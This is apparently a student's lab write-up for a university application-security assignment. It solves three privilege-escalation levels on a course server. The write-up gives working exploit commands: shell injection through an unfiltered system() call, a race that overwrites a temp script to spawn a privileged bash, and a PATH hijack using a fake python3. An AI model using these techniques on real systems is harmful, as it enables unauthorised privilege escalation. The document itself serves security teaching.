# Assignment 2

Solving each level as we go.
SSH into the client

```
ssh students24@appsec2026 -i students24.key -J s4508882@ssh.liacs.nl
```

# Level 1
Dictionary:
```
students24@appsec2026:/levels/level1$ ls
b.dict  level1  level1.c
```

Reading level1.c, we can see a `system()` call without any proper filtering of the input, therefore, we can simply execute a command by appending it to the word we are searching for

Malicious input:
`./level1 "xxxxx; /bin/sh"`

This opens a shell with level1 group access
Then execute `escalate`

# Level 2 
CD into level 2:
`cd /levels/level2`
Files:
```
dr-xr-x---  2 root level1  4096 Mar 17 09:48 .
dr-xr-xr-x 12 root root    4096 Mar 17 09:49 ..
-r-xr-sr-x  1 root level2 16640 Mar 17 09:48 level2
-r--r-----  1 root level1  1337 Mar 17 09:48 level2.c
```

Executing level2 asks for input (potential buffer overflow/malicious input again)
reading level2.c
There is a buffer that is put into a `execl()` call. Looking at the docs for this
```
The exec() family of functions replaces the current process image
       with a new process image.  The functions described in this manual
       page are layered on top of execve(2).  (See the manual page for
       execve(2) for further details about the replacement of the current
       process image.)

       The initial argument for these functions is the name of a file
       that is to be executed.

       The functions can be grouped based on the letters following the
       "exec" prefix.


The const char *arg and subsequent ellipses can be thought of as
       arg0, arg1, ..., argn.  Together they describe a list of one or
       more pointers to null-terminated strings that represent the
       argument list available to the executed program.  The first
       argument, by convention, should point to the filename associated
       with the file being executed.  The list of arguments must be
       terminated by a null pointer, and, since these are variadic
       functions, this pointer must be cast (char *) NULL.

       By contrast with the 'l' functions, the 'v' functions (below)
       specify the command-line arguments of the executed program as a
       vector.
```
Therefore, it executes /bin/bash with the arguments:
`/bin/bash {file_loc} {user_input}`

so this executes our bash-script at file_loc with the user_input as an argument.
the temp file is stored as `/.runtime.sh`, we should be able to manipulate it whilst the program waits for input, and simply
change the code.

We run the program concurrently:
`./level2 &` then with a free shell, we manipulate the temp file
Full command:
```
./level2 & (sleep 1 & echo -e '#!/bin/bash\n/bin/bash -p -i' > ~/.runtime.sh & sleep 1)
```
This process has now been put into the background (can be found using `jobs`)
Call `fg` to return to the previous process, it should now have opened a (bash)ell.
Now execute `escalate` and your priveleges are fixed.

Permanently added students24 to group level2, congratulations!
/!\ Remember to log in again to reload your groups. /!\

# Level 3
Looking at the python code, there are no clear vulnerabilities. However, the system command that is run executes python3, what python3 executable this is, we do not know. So, we can determine that ourselves

## Step 1
Create a new python file
`mkdir /tmp/evilpython/`
## Step 2
Write a script 
`vim /tmp/evilpython/python3`
and write the following:
```
#!/bin/bash
./escalate
```
## Step 3: execute
Set the script to allow execution:
`chmod +x /tmp/evilpython/python3`
Then proceed to execute with new path variable
`PATH=/tmp/evilpython:$PATH ./level3`
Win (execute `escalate`).